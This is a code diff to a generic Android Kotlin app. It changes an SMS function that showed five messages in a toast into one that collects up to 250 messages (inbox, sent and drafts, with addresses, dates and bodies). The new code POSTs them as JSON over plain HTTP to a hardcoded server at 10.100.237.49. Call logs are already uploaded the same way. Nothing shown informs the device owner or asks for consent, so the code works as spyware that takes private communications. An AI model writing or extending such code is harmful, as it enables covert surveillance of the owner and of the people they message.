@@ -2,6 +2,7 @@ package com.example.myapplication
 
 import android.Manifest
 import android.content.pm.PackageManager
+import android.net.Uri
 import android.os.Bundle
 import android.provider.CallLog
 import android.widget.Button
@@ -105,6 +106,7 @@ class MainActivity : AppCompatActivity() {
             CallLog.Calls.DATE + " DESC"
         )
 
+        val stringBuilder = StringBuilder()
         var count = 0
         val maxLogs = 250
 
@@ -143,36 +145,86 @@ class MainActivity : AppCompatActivity() {
         uploadCallLogs(logs)
     }
 
-    private fun getSmsMessages() {
-        val cursor = contentResolver.query(
-            android.net.Uri.parse("content://sms/inbox"),
-            null, null, null, "date DESC"
-        )
+    private fun uploadSmsMessages(logs: List<Map<String, String>>) {
+        Thread {
+            try {
+                val url = URL("http://10.100.237.49:5000/upload_sms_logs/1")
+                val conn = url.openConnection() as HttpURLConnection
+                conn.requestMethod = "POST"
+                conn.setRequestProperty("Content-Type", "application/json; utf-8")
+                conn.doOutput = true
 
-        val stringBuilder = StringBuilder()
+                val jsonBody = JSONObject()
+                val jsonArray = JSONArray()
 
-        cursor?.use {
-            val indexBody = it.getColumnIndex("body")
-            val indexAddress = it.getColumnIndex("address")
-            val indexDate = it.getColumnIndex("date")
+                for (log in logs) {
+                    val item = JSONObject()
+                    item.put("address", log["address"])
+                    item.put("type", log["type"])
+                    item.put("date", log["date"])
+                    item.put("body", log["body"])
+                    jsonArray.put(item)
+                }
 
-            var count = 0
-            while (it.moveToNext() && count < 5) { // Limit to 5 messages for toast readability
-                val address = it.getString(indexAddress)
-                val body = it.getString(indexBody)
-                val date = it.getString(indexDate)
-                val formattedDate = SimpleDateFormat(
-                    "yyyy-MM-dd HH:mm:ss", Locale.getDefault()
-                ).format(Date(date.toLong()))
+                jsonBody.put("logs", jsonArray)
 
-                stringBuilder.append("From: $address\nDate: $formattedDate\nMessage: $body\n\n")
-                count++
+                val outputStream = conn.outputStream
+                outputStream.write(jsonBody.toString().toByteArray())
+                outputStream.flush()
+                outputStream.close()
+
+                val responseCode = conn.responseCode
+                println("SMS Upload response: $responseCode")
+
+            } catch (e: Exception) {
+                e.printStackTrace()
             }
-        }
-
-        Toast.makeText(this, stringBuilder.toString(), Toast.LENGTH_LONG).show()
+        }.start()
     }
 
+    private fun getSmsMessages() {
+        val logs = mutableListOf<Map<String, String>>()
+        val uri = Uri.parse("content://sms")
+        val projection = arrayOf("address", "date", "body", "type")
+        val cursor = contentResolver.query(uri, projection, null, null, "date DESC")
+
+        val maxLogs = 250
+        var count = 0
+
+        if (cursor != null && cursor.moveToFirst()) {
+            do {
+                val address = cursor.getString(cursor.getColumnIndexOrThrow("address"))
+                val date = cursor.getLong(cursor.getColumnIndexOrThrow("date"))
+                val body = cursor.getString(cursor.getColumnIndexOrThrow("body"))
+                val typeInt = cursor.getInt(cursor.getColumnIndexOrThrow("type"))
+
+                val type = when (typeInt) {
+                    1 -> "Inbox"
+                    2 -> "Sent"
+                    3 -> "Draft"
+                    else -> "Unknown"
+                }
+
+                val dateFormatted = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
+                    .format(Date(date))
+
+                logs.add(
+                    mapOf(
+                        "address" to address,
+                        "type" to type,
+                        "date" to dateFormatted,
+                        "body" to body
+                    )
+                )
+                count++
+            } while (cursor.moveToNext() && count < maxLogs)
+
+            cursor.close()
+        }
+
+        // Send to backend
+        uploadSmsMessages(logs)
+    }
 
     // Handle permission result
     override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
